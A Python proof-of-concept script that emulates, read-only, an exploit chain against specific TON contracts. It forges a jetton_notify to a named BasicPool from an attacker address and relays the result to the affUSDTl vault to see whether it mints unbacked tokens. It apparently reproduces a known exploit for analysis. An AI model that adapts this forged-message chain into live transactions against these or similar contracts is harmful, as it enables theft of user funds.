#!/usr/bin/env python3
"""
FULL-CHAIN test: forge a jetton_notify to the *verified BasicPool* with
sender = the affUSDTl vault master; extract the pool's 0xa1b21e8b relay to the
vault; feed it to the vault; does the vault mint?  READ-ONLY (lite + local TVM).
"""
import base64, json, time
from tonpy.types import LiteClient, Address, Cell, CellBuilder, VmDict
from tonpy.tvm import Emulator
from tonpy.autogen.block import Account, ShardAccount, Transaction

BASICPOOL = "EQCrEHHG4Ff8TD3PzuH5tFSwHBD3zxeXaosz48jGLebwiiNx"
VAULT = "EQAGtgnr1G0XDilGURcOB3pUhl-Lo__J-TaJP0K4ey8cuSaW"       # affUSDTl master
VAULT_RAW = "0:06b609ebd46d170e294651170e077a54865f8ba3ffc9f936893f42b87b2f1cb9"
ATTACKER = "0:34461ba017e4799eeee0628521e505226ef405e087cabb765eb50a882e5550a2"
A1B = 0xa1b21e8b

def coins(b, v):
    if v == 0: b.store_uint(0, 4); return
    nb = (v.bit_length() + 7) // 8
    b.store_uint(nb, 4); b.store_uint(v, nb * 8)

def _data(acc):
    if acc is None or not hasattr(acc, "storage"): return None
    stt = acc.storage.state
    if not hasattr(stt, "x"): return None
    d = stt.x.data
    return None if d is None else getattr(d, "value", d)
def data_of_account(c): return _data(Account().cell_unpack(c, rec_unpack=True))
def data_of_shard(c):
    sa = ShardAccount().cell_unpack(c, rec_unpack=True)
    return _data(sa.account if sa is not None else None)

def build_notify(amount, sender, fwd):
    b = CellBuilder(); b.store_uint(0x7362d09c, 32); b.store_uint(1700000000000, 64); coins(b, amount)
    b.store_address(Address(sender))
    if fwd is None: b.store_bool(False)
    else: b.store_bool(True); b.store_ref(fwd)
    return b.end_cell()

def build_msg(src, dest, value_nano, body, lt, now):
    m = CellBuilder()
    m.store_bool(False); m.store_bool(True); m.store_bool(True); m.store_bool(False)
    m.store_address(Address(src)); m.store_address(Address(dest))
    coins(m, value_nano); m.store_bool(False); coins(m, 0); coins(m, 0)
    m.store_uint(lt, 64); m.store_uint(now, 32)
    m.store_bool(False); m.store_bool(True); m.store_ref(body)
    return m.end_cell()

def out_msgs_of(txcell):
    cs = txcell.begin_parse()
    cs.load_uint(4); cs.load_uint(256); cs.load_uint(64); cs.load_uint(256)
    cs.load_uint(64); cs.load_uint(32); cs.load_uint(15); cs.load_uint(2); cs.load_uint(2)
    aux = cs.load_ref(); acs = aux.begin_parse()
    if acs.load_bool(): acs.load_ref()
    out = []
    if not acs.load_bool(): return out
    hmap = acs.load_ref()
    d = VmDict(15, False, hmap)
    for k, v in d.get_iter():
        # value is ^Message : a ref
        msg = None
        try:
            msg = v.load_ref()
        except Exception:
            try:
                msg = v.copy().load_ref()
            except Exception:
                msg = None
        if msg is not None: out.append((k, msg))
    return out

def msg_dest_op(msgcell):
    cs = msgcell.begin_parse()
    tag = cs.load_uint(1)
    cs.load_bool(); cs.load_bool(); cs.load_bool()
    src = cs.load_address(); dest = cs.load_address()
    cs.load_var_uint(16)          # value grams
    cs.load_bool()                # extra-currency dict (empty)
    cs.load_var_uint(16); cs.load_var_uint(16)   # ihr_fee, fwd_fee
    cs.load_uint(64); cs.load_uint(32)
    has_init = cs.load_bool()
    br = cs.load_bool()
    body = cs.load_ref() if br else cs
    bcs = body.begin_parse() if hasattr(body, "begin_parse") else body
    op = bcs.preload_uint(32) if bcs.bits >= 32 else None
    return str(dest), op

def retry(fn, n=8):
    last=None
    for _ in range(n):
        try: return fn()
        except Exception as e: last=e; time.sleep(1.5)
    raise last

def main():
    lc = LiteClient(mode="roundrobin", timeout=4, num_try=8)
    blk = retry(lambda: lc.get_masterchain_info_ext().last); now = lc.get_time()
    _, cfgraw = retry(lambda: lc.get_config_all(blk))
    cfg = VmDict(32)
    for k, cs in cfgraw.get_iter():
        if k != 43: cfg.set(k, cs)

    # 1) forge notify to BasicPool -- use the REAL exploit notify body (src swapped to attacker)
    real_notify = json.load(open("/tmp/opencode/aff/pool_notify_tx.json"))["in_msg"]["raw_body"]
    body = Cell(base64.b64encode(bytes.fromhex(real_notify)).decode())
    st = retry(lambda: lc.get_account_state(Address(BASICPOOL), blk))
    lt = st.last_trans_lt + 1; ss = st.to_shard_state()
    msg = build_msg(ATTACKER, BASICPOOL, 1_500_000_000, body, lt, now)
    em = Emulator(cfg); em.set_ignore_chksig(True)
    ok = em.emulate_transaction(ss, msg, now, lt)
    txcell = em.transaction.to_cell()
    outs = out_msgs_of(txcell)
    print(f"[1] BasicPool notify ok={ok} out_msgs={len(outs)}")
    relay = None
    for k, m in outs:
        dest, op = msg_dest_op(m)
        print(f"    out -> dest={dest} op={hex(op) if op is not None else None}")
        if op == A1B:
            relay = m
            try:
                rb = m.begin_parse()
                rb.load_uint(1); rb.load_bool(); rb.load_bool(); rb.load_bool()
                rb.load_address(); rb.load_address()
                rb.load_var_uint(16); rb.load_bool(); rb.load_var_uint(16); rb.load_var_uint(16)
                rb.load_uint(64); rb.load_uint(32); rb.load_bool()
                if rb.load_bool():
                    bodyc = rb.load_ref()
                    print("    relay body hex:", bodyc.to_boc())
            except Exception as e:
                print("    relay body dump err", repr(e))
    if relay is None:
        print("RESULT: pool did NOT relay 0xa1b21e8b to the vault for this input")
        return

    # 2) feed the relay to the vault
    st2 = retry(lambda: lc.get_account_state(Address(VAULT), blk))
    lt2 = st2.last_trans_lt + 1; ss2 = st2.to_shard_state()
    hb = data_of_account(ss2.begin_parse().load_ref()).get_hash()
    em2 = Emulator(cfg); em2.set_ignore_chksig(True)
    ok2 = em2.emulate_transaction(ss2, relay, now, lt2)
    da = data_of_shard(em2.account.to_cell())
    ha = da.get_hash() if da is not None else None
    print(f"[2] vault receives relay: ok={ok2} data_changed={ha != hb} before={hb[:12]} after={str(ha)[:12]}")
    try:
        vouts = out_msgs_of(em2.transaction.to_cell())
        print(f"    vault out_msgs={len(vouts)}")
        for k, m in vouts:
            dest, op = msg_dest_op(m)
            print(f"      -> dest={dest} op={hex(op) if op is not None else None}")
    except Exception as e:
        print("    out_msgs parse err", repr(e))
    if ha != hb and da is not None:
        open("/tmp/opencode/aff/after_chain_vault.boc","wb").write(base64.b64decode(da.to_boc()))
        print("    -> VAULT MINTED / STORAGE CHANGED via the BasicPool relay")

if __name__ == "__main__":
    main()
